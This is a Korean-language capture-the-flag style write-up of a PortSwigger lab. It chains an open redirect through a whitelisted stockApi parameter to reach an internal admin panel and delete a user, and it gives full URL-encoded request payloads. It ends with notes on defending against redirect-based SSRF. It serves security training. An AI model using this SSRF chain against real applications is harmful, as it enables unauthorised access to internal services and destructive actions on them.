# Lab: SSRF with filter bypass via open redirection

## 개요

- **난이도**: Practitioner
- **주제**: SSRF — 화이트리스트 필터 우회 / Open Redirect 경유 / 상대경로 SSRF
- **링크**: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

## 목표

`stockApi` 파라미터에 화이트리스트 필터가 있어 외부 URL이 직접 차단된다. 애플리케이션 내부의 open redirect 취약점을 경유해 필터를 우회하고, `192.168.0.12:8080` 에 있는 관리자 패널에 접근해 carlos 를 삭제한다.

## 004 랩과의 차이

```
[004 랩 — 블랙리스트 필터]
  차단 목록: 127.0.0.1, localhost, /admin
  우회: 축약형 loopback + 더블 URL 인코딩
  대상: 서버 자신 (loopback)

[005 랩 (이번) — 화이트리스트 필터]
  허용 목록: 같은 도메인(상대경로 포함)만 통과
  우회: 자사 도메인 내 open redirect 경유
  대상: 내부 백엔드 (192.168.0.12:8080) — 랩에서 제공
```

## 공격 흐름

### 1단계 — Open Redirect 취약점 확인

상품 목록의 "Next product" 버튼 클릭 시 발생하는 요청:

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
```

응답:
```
HTTP/1.1 302 Found
Location: /product?productId=2
```

`path` 파라미터 값을 임의 URL 로 교체해도 302 로 리다이렉트된다:

```
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
→ 302 Location: http://192.168.0.12:8080/admin
```

이것이 open redirect 취약점이다.

### 2단계 — stockApi 필터 분석

조회 요청:

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=%2fproduct%2fstockPrice%3fproductId%3d1%26storeId%3d1
```

- `stockApi` 값은 URL 인코딩된 상태로 전송된다.
- 서버는 이 값을 디코딩 후 해당 경로로 서버 측 요청을 보낸다.
- 외부 절대 URL(`http://192.168.0.12:8080/admin`)을 직접 넣으면 필터에 막힌다.
- **같은 도메인의 상대경로는 허용된다** → open redirect 경유로 우회 가능.

### 3단계 — /admin 접근 및 delete 경로 확인

`stockApi` 에 open redirect 경로를 상대경로로 삽입:

```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

URL 인코딩 후 전송:

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin
```

응답 body 에 관리자 패널 HTML 이 반환되며, 여기서 삭제 경로를 확인:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

### 4단계 — carlos 삭제

`stockApi` 에 delete 경로까지 포함해 전송:

```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

URL 인코딩 후:

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
```

## 서버 측 동작 흐름

```
[클라이언트]
  POST /product/stock
  stockApi=/product/nextProduct?...&path=http://192.168.0.12:8080/admin/delete?username=carlos
           ↓
[프론트엔드 서버]
  필터 검사: 상대경로 → 같은 도메인 → 허용
  서버 측 GET /product/nextProduct?...&path=http://192.168.0.12:8080/admin/delete?username=carlos
           ↓
  302 Location: http://192.168.0.12:8080/admin/delete?username=carlos
           ↓
  서버 측 GET http://192.168.0.12:8080/admin/delete?username=carlos
           ↓
[내부 백엔드 (192.168.0.12:8080)]
  내부 IP → 인증 없이 허용
  carlos 삭제 처리
           ↓
[프론트엔드 서버]
  응답을 클라이언트에 반환
```

## Burp Suite 사용 시 URL 인코딩 주의

```
[문제 상황]
  Burp Repeater 에서 body 입력 시 = 과 & 가 그대로 보임
  하지만 실제 전송 시 URL 인코딩 여부가 파라미터 파싱에 영향을 미침

[핵심 규칙]
  stockApi 의 값 전체를 URL 인코딩해야 한다.
  특히 path 파라미터 안의 ? 와 & 는 반드시 인코딩:
    ?  →  %3f
    &  →  %26
    =  →  %3d
    /  →  %2f
    :  →  %3a

[잘못된 예]
  stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
  → stockApi 구분자 & 와 path 내부 & 가 혼재 → 서버가 잘못 파싱

[올바른 예]
  stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
  → stockApi 값 전체가 하나의 문자열로 전달
```

## 화이트리스트 필터 우회 원리

```
[화이트리스트 검사 방식 (추정)]
  절대 URL 중 외부 도메인 → 차단
  같은 도메인의 절대 URL 또는 상대경로 → 허용

[우회 핵심]
  open redirect 경로(/product/nextProduct?path=)는 같은 도메인 상대경로
  → 필터 통과
  → 서버가 해당 경로로 요청 → 302 응답
  → 서버가 302 를 따라가며 내부 IP 로 요청
  → 내부 접근 성공

[화이트리스트가 충분하지 않은 이유]
  애플리케이션 내부에 open redirect 가 존재하면
  같은 도메인이어도 임의 목적지로 이동 가능
  → 화이트리스트 + open redirect 제거 를 함께 적용해야 함
```

## 핵심 정리

- 화이트리스트 필터도 내부 open redirect 가 있으면 우회 가능하다.
- `stockApi` 에 상대경로로 open redirect 경로를 넣으면, 서버가 해당 경로를 따라가다 내부 IP 로 리다이렉트된다.
- 내부 admin IP(`192.168.0.12:8080`)는 랩이 제공하며, `/admin` 응답 body 에서 delete 경로를 확인한다.
- Burp Suite body 에서 `stockApi` 값 내부의 `?`, `&`, `=` 는 URL 인코딩(`%3f`, `%26`, `%3d`)해야 파라미터가 올바르게 전달된다.

## 배운 점 및 추가 학습

### 1. Open Redirect 의 SSRF 연계 위험

```
일반적 평가:
  Open Redirect = 낮은 심각도 (피싱 유도 정도)

SSRF 화이트리스트 우회에 연계되면:
  같은 도메인 경로로 필터 통과
  → 내부 시스템 접근 가능
  → 심각도 High/Critical 로 상향

시사점:
  Open Redirect 는 단독 취약점이 아닌
  공격 체인의 연결 고리로 항상 평가해야 함
```

### 2. SSRF 방어 — 리다이렉트 처리

```python
import requests

# 취약한 설정 (기본값 — 리다이렉트 자동 추적)
resp = requests.get(url, allow_redirects=True)

# 안전한 설정 — 리다이렉트 차단 또는 재검증
resp = requests.get(url, allow_redirects=False)
if resp.status_code in (301, 302, 307, 308):
    location = resp.headers.get("Location", "")
    if not is_safe_url(location):  # 화이트리스트 재검증
        raise ValueError("허용되지 않은 리다이렉트 대상")
```

### 3. URL 인코딩 중첩 주의

```
body 파라미터 안에 URL 이 포함될 때:

  외부 파라미터 구분자: & (body level)
  내부 URL 파라미터:    & (URL level) → %26 으로 인코딩 필요

  ?  (URL 시작)         → %3f
  &  (URL 파라미터 구분) → %26
  =  (값 구분)           → %3d
  :  (프로토콜 구분)     → %3a
  /  (경로 구분)         → %2f

Burp Suite 에서 body 편집 시:
  Inspector 패널에서 디코딩 상태로 확인
  Raw 탭에서 실제 인코딩 상태 확인 권장
```


